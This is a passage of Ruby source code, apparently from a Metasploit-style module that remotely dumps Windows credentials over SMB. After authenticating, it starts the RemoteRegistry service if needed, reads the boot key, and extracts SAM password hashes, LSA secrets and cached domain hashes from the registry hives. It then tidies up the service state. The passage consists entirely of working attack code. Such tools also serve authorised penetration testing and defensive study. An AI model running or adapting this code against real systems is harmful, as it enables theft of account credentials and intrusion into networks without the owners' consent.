        secret_size = decrypted[0, 4].unpack('<L').first
        secret = decrypted[16, secret_size]
      else
        encrypted_secret_size = encrypted_secret[0, 4].unpack('<L').first
        secret = decrypt_secret_data(encrypted_secret[(encrypted_secret.size - encrypted_secret_size)..-1], lsa_key)
      end
      print_secret(key, secret)
    end
  end

  def do_cleanup
    print_status('Cleaning up...')
    if @service_should_be_stopped
      print_status('Stopping service RemoteRegistry...')
      svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
      @svcctl.control_service(svc_handle, RubySMB::Dcerpc::Svcctl::SERVICE_CONTROL_STOP)
    end

    if @service_should_be_disabled
      print_status('Disabling service RemoteRegistry...')
      @svcctl.change_service_config_w(svc_handle, start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)
    end
  rescue RubySMB::Dcerpc::Error::SvcctlError => e
    vprint_warning("An error occured when cleaning up: #{e}")
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def open_sc_manager
    vprint_status('Opening Service Control Manager')
    @svcctl = @tree.open_file(filename: 'svcctl', write: true, read: true)

    vprint_status('Binding to \\svcctl...')
    @svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
    vprint_good('Bound to \\svcctl')

    @svcctl.open_sc_manager_w(sock.peerhost)
  end

  def run
    connect
    unless simple.client.is_a?(RubySMB::Client)
      fail_with(Module::Failure::BadConfig,
                'RubySMB client must be used for this (current client is'\
                "#{simple.client.class.name}). Make sure 'SMB::ProtocolVersion' advanced"\
                'option contains at least one SMB version greater then SMBv1 (e.g. '\
                "'set SMB::ProtocolVersion 1,2,3').")
    end
    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::NoAccess,
                "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,
                "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      @scm_handle = open_sc_manager
    rescue RubySMB::Error::RubySMBError => e
      print_error(
        'Unable to connect to the remote Service Control Manager. It will fail '\
        "if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e})."
      )
    end

    begin
      enable_registry if @scm_handle
    rescue RubySMB::Error::RubySMBError => e
      print_error(
        "Error when checking/enabling the 'RemoteRegistry' service. It will "\
        "fail if it is stopped or disabled ([#{e.class}] #{e})."
      )
    end

    begin
      @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
      @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,
                "Error when connecting to 'winreg' interface ([#{e.class}] #{e}).")
    end

    begin
      boot_key = get_boot_key
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when getting bootKey: #{e}")
      boot_key = ''
    end
    fail_with(Module::Failure::Unknown, 'Unable to get bootKey') if boot_key&.empty?
    report_info(boot_key.unpack('H*')[0], 'host.boot_key')

    lm_hash_not_stored?

    begin
      sam = save_sam
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
      sam = nil
    end

    if sam
      reg_parser = Msf::Util::WindowsRegistryParser.new(sam)
      dump_sam_hashes(reg_parser, boot_key)
    end

    begin
      security = save_security
    rescue RubySMB::Error::RubySMBError => e
      print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
      security = nil
    end

    if security
      reg_parser = Msf::Util::WindowsRegistryParser.new(security)
      lsa_key = get_lsa_secret_key(reg_parser, boot_key)
      if lsa_key.nil? || lsa_key.empty?
        print_status('No LSA key, skip LSA secrets and cached hashes dump')
      else
        report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
        dump_lsa_secrets(reg_parser, lsa_key)
        nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
        if nlkm_key.nil? || nlkm_key.empty?
          print_status('No NLKM key (skip cached hashes dump)')
        else
          report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
          dump_cached_hashes(reg_parser, nlkm_key)
        end
      end
    end

    do_cleanup
  rescue RubySMB::Error::RubySMBError => e
    fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
  rescue Rex::ConnectionError => e
    fail_with(Module::Failure::Unreachable, "[#{e.class}] #{e}")
  rescue ::StandardError => e
    do_cleanup
    raise e
  ensure
    if @svcctl
      @svcctl.close_service_handle(@scm_handle) if @scm_handle
      @svcctl.close
    end
    @winreg.close if @winreg
    @tree.disconnect! if @tree
    simple.client.disconnect! if simple&.client.is_a?(RubySMB::Client)
    disconnect
  end
end
